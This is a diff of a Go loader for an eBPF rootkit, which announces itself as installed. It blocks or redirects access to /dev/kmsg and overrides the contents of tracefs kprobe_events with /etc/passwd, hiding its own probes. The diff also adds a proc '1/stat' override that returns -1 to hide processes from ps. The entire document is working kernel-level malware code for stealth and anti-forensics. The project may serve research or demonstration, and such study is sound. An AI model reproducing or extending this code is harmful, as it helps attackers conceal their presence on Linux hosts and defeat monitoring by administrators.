@@ -32,6 +32,9 @@ var mainManager = &manager.Manager{
 		{
 			Section: "kretprobe/vfs_read",
 		},
+		{
+			Section: "kprobe/__x64_sys_close",
+		},
 	},
 }
 
@@ -40,7 +43,7 @@ var userWriteManager = &manager.Manager{}
 const (
 	KMsgAction uint64 = iota + 1
 	OverrideContent
-	OverrideReturn0
+	OverrideReturn
 )
 
 const (
@@ -101,13 +104,13 @@ func (p *FdContent) Bytes() []byte {
 	return b
 }
 
-type FdKey struct {
+type RkFdKey struct {
 	Fd  uint64
 	Pid uint32
 }
 
 // Write write binary representation
-func (p *FdKey) Write(buffer []byte) {
+func (p *RkFdKey) Write(buffer []byte) {
 	ByteOrder.PutUint64(buffer[0:8], p.Fd)
 	ByteOrder.PutUint32(buffer[8:12], p.Pid)
 
@@ -116,25 +119,27 @@ func (p *FdKey) Write(buffer []byte) {
 }
 
 // Bytes returns array of byte representation
-func (p *FdKey) Bytes() []byte {
+func (p *RkFdKey) Bytes() []byte {
 	b := make([]byte, 16)
 	p.Write(b)
 	return b
 }
 
-// RkAttr represents a file
-type RkAttr struct {
+// RkFdAttr represents a file
+type RkFdAttr struct {
 	Action uint64
+	Value  int64
 }
 
 // Write write binary representation
-func (p *RkAttr) Write(buffer []byte) {
+func (p *RkFdAttr) Write(buffer []byte) {
 	ByteOrder.PutUint64(buffer[0:8], p.Action)
+	ByteOrder.PutUint64(buffer[8:16], uint64(p.Value))
 }
 
 // Bytes returns array of byte representation
-func (p *RkAttr) Bytes() []byte {
-	b := make([]byte, 24)
+func (p *RkFdAttr) Bytes() []byte {
+	b := make([]byte, 48)
 	p.Write(b)
 	return b
 }
@@ -176,16 +181,16 @@ func RkPathKeys(s string) []RkPathKey {
 	return keys
 }
 
-// PutPath put the path in the kernel map
-func PutPath(m *ebpf.Map, path string, action PathAction) error {
-	var zeroAction PathAction
+// PutPathAttr put the path in the kernel map
+func PutPathAttr(m *ebpf.Map, path string, attr PathAttr) error {
+	var zeroAttr PathAttr
 	for i, key := range RkPathKeys(path) {
 		if i == 0 {
-			if err := m.Put(key.Bytes(), action.Bytes()); err != nil {
+			if err := m.Put(key.Bytes(), attr.Bytes()); err != nil {
 				return err
 			}
 		} else {
-			if err := m.Put(key.Bytes(), zeroAction.Bytes()); err != nil {
+			if err := m.Put(key.Bytes(), zeroAttr.Bytes()); err != nil {
 				return err
 			}
 		}
@@ -194,24 +199,26 @@ func PutPath(m *ebpf.Map, path string, action PathAction) error {
 	return nil
 }
 
-// PathAction represents actions to apply for a path
-type PathAction struct {
+// PathAttr represents attr to apply for a path
+type PathAttr struct {
 	FSType     string
 	Action     uint64
 	OverrideID uint64
+	Value      int64
 }
 
 // Write write binary representation
-func (p *PathAction) Write(buffer []byte) {
+func (p *PathAttr) Write(buffer []byte) {
 	hash := FNVHashStr(p.FSType)
 	ByteOrder.PutUint64(buffer[0:8], hash)
 	ByteOrder.PutUint64(buffer[8:16], p.Action)
 	ByteOrder.PutUint64(buffer[16:24], p.OverrideID)
+	ByteOrder.PutUint64(buffer[24:32], uint64(p.Value))
 }
 
 // Bytes returns array of byte representation
-func (p *PathAction) Bytes() []byte {
-	b := make([]byte, 24)
+func (p *PathAttr) Bytes() []byte {
+	b := make([]byte, 32)
 	p.Write(b)
 	return b
 }
@@ -223,13 +230,13 @@ var c = []manager.ConstantEditor{
 	},
 }
 
-func getFdKeys(path string) []FdKey {
+func getRkFdKeys(path string) []RkFdKey {
 	matches, err := filepath.Glob("/proc/*/fd/*")
 	if err != nil {
 		return nil
 	}
 
-	var keys []FdKey
+	var keys []RkFdKey
 	for _, match := range matches {
 		if f, err := os.Readlink(match); err == nil {
 			if f == path {
@@ -244,7 +251,7 @@ func getFdKeys(path string) []FdKey {
 					continue
 				}
 
-				keys = append(keys, FdKey{
+				keys = append(keys, RkFdKey{
 					Fd:  uint64(fd),
 					Pid: uint32(pid),
 				})
@@ -298,6 +305,10 @@ func Kmsg(str string) {
 	f.WriteString(str)
 }
 
+func HandleError(err error) {
+	panic(err)
+}
+
 func main() {
 	options := manager.Options{
 		DefaultKProbeMaxActive: 512,
@@ -308,35 +319,43 @@ func main() {
 
 	// Initialize the main manager
 	if err := mainManager.InitWithOptions(mainAsset(), options); err != nil {
-		panic(err)
+		HandleError(err)
 	}
 
 	// Start the manager
 	if err := mainManager.Start(); err != nil {
-		panic(err)
+		HandleError(err)
 	}
 
 	// block process already having fd on kmsg
-	for _, fdKey := range getFdKeys("/dev/kmsg") {
-		filesMap, _, _ := mainManager.GetMap("rk_fd_attrs")
-
-		file := RkAttr{
-			Action: OverrideReturn0,
+	for _, RkFdKey := range getRkFdKeys("/dev/kmsg") {
+		filesMap, _, err := mainManager.GetMap("rk_fd_attrs")
+		if err != nil {
+			HandleError(err)
 		}
 
-		filesMap.Put(fdKey.Bytes(), file.Bytes())
+		file := RkFdAttr{
+			Action: OverrideReturn,
+		}
+
+		if err = filesMap.Put(RkFdKey.Bytes(), file.Bytes()); err != nil {
+			HandleError(err)
+		}
 	}
 
 	// block process that will open kmsg
 	pathKeysMap, _, _ := mainManager.GetMap("rk_path_keys")
-	action := PathAction{
+	attr := PathAttr{
 		FSType: "devtmpfs",
-		Action: OverrideReturn0,
+		Action: OverrideReturn,
 	}
-	PutPath(pathKeysMap, "kmsg", action)
+	if err := PutPathAttr(pathKeysMap, "kmsg", attr); err != nil {
+		HandleError(err)
+	}
 
 	Kmsg("Your Rootkit is now installed")
 
+	// second step
 	rkFilesMap, _, _ := mainManager.GetMap("rk_files")
 	rkFdAttrsMap, _, _ := mainManager.GetMap("rk_fd_attrs")
 	rkFdContentsMap, _, _ := mainManager.GetMap("rk_fd_contents")
@@ -358,17 +377,17 @@ func main() {
 	}
 
 	if err := userWriteManager.InitWithOptions(userWriteAsset(), options); err != nil {
-		panic(err)
+		HandleError(err)
 	}
 
 	// Start the user manager
 	if err := userWriteManager.Start(); err != nil {
-		panic(err)
+		HandleError(err)
 	}
 
 	// update main tail call with the ones from user
 	kmsgProg, _, _ := userWriteManager.GetProgram(manager.ProbeIdentificationPair{Section: "kprobe/kmsg"})
-	overrideContentProg, _, _ := userWriteManager.GetProgram(manager.ProbeIdentificationPair{Section: "kprobe/overide_content"})
+	overrideContentProg, _, _ := userWriteManager.GetProgram(manager.ProbeIdentificationPair{Section: "kprobe/override_content"})
 	routes := []manager.TailCallRoute{
 		{
 			ProgArrayName: "read_ret_progs",
@@ -384,27 +403,44 @@ func main() {
 	mainManager.UpdateTailCallRoutes(routes...)
 
 	// unblock
-	for _, fdKey := range getFdKeys("/dev/kmsg") {
-		filesMap, _, _ := mainManager.GetMap("rk_fd_attrs")
-		filesMap.Delete(fdKey.Bytes())
+	for _, RkFdKey := range getRkFdKeys("/dev/kmsg") {
+		filesMap, _, err := mainManager.GetMap("rk_fd_attrs")
+		if err != nil {
+			HandleError(err)
+		}
+		filesMap.Delete(RkFdKey.Bytes())
 	}
 
 	// change action from override to write user
-	action = PathAction{
+	attr = PathAttr{
 		FSType: "devtmpfs",
 		Action: KMsgProg,
 	}
-	PutPath(pathKeysMap, "kmsg", action)
+	if err := PutPathAttr(pathKeysMap, "kmsg", attr); err != nil {
+		HandleError(err)
+	}
 
-	action = PathAction{
+	attr = PathAttr{
 		FSType:     "tracefs",
 		Action:     OverrideContent,
 		OverrideID: FNVHashStr("kprobe_events"),
 	}
-	PutPath(pathKeysMap, "kprobe_events", action)
+	if err := PutPathAttr(pathKeysMap, "kprobe_events", attr); err != nil {
+		HandleError(err)
+	}
 
 	contentsMap, _, _ := mainManager.GetMap("rk_fd_contents")
 	PutFdContent(contentsMap, FNVHashStr("kprobe_events"), "/etc/passwd")
+
+	// ps
+	attr = PathAttr{
+		FSType: "proc",
+		Action: OverrideReturn,
+		Value:  -1,
+	}
+	if err := PutPathAttr(pathKeysMap, "1/stat", attr); err != nil {
+		HandleError(err)
+	}
 
 	wait()
 
